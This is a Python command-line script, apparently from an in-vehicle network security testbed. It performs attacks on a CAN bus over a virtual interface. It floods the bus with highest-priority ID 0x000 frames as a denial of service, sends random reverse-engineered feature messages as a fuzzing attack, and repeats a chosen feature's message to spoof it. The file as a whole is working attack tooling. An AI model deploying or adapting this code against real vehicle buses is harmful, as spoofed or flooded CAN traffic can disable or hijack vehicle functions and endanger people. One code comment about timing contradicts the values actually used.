import argparse
import can
import time
import random

from reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER

def denial_of_service_func(bus, period: float):
    while True:
        msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
        bus.send(msg)
        print(f"Sent message: {msg}")
        time.sleep(period)


def fuzzy_attack_func(bus):
    known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    n_of_attacks = len(known_attacks)

    while True:
        # Select a random time between 0.1 and 0.01 using another approach
        sleep_time = random.uniform(0.5, 1.0)
        # Select a random attack
        attack = random.choice(known_attacks)
        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
        bus.send(msg)
        print(f"Sent fuzzy attack message: {msg}")
        time.sleep(sleep_time)

def spoofing_attacks_func(bus, feature: str, period: float):
    print(f"inside spoofing attack")
    selected_feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
    print(f"selected_feature = {selected_feature}")
    while True:
        msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'], is_extended_id=False)
        bus.send(msg)
        print(f"Sent message: {msg}")
        time.sleep(period)


def main():
    print("CAN network attacks CLI")
    spoofing_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
    available_features = [*spoofing_attacks, "fuzzy", "denial_of_service"]

    parser = argparse.ArgumentParser(description="Perform CAN network attacks.")
    parser.add_argument("--feature", choices=available_features, help="Feature to attack")
    parser.add_argument("--period", type=float, default=0.1, help="Period between messages in seconds")

    args = parser.parse_args()
    if not args.feature:
        print("No feature specified. Use --feature to select a feature.")
        return
    if args.feature not in available_features:
        print(f"Feature '{args.feature}' is not available. Choose from {available_features}.")
    bus = can.interface.Bus(channel='vcan0', interface='socketcan')

    try:
        if args.feature == "fuzzy":
            print(f"Attacking feature: {args.feature}")
            fuzzy_attack_func(bus)
        elif args.feature == "denial_of_service":
            print(f"Attacking feature: {args.feature} with period {args.period} seconds")
            denial_of_service_func(bus, args.period)
        else:
            print(f"Attacking feature: {args.feature} with period {args.period} seconds")
            spoofing_attacks_func(bus, args.feature, args.period)
    except KeyboardInterrupt:
        print("Attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
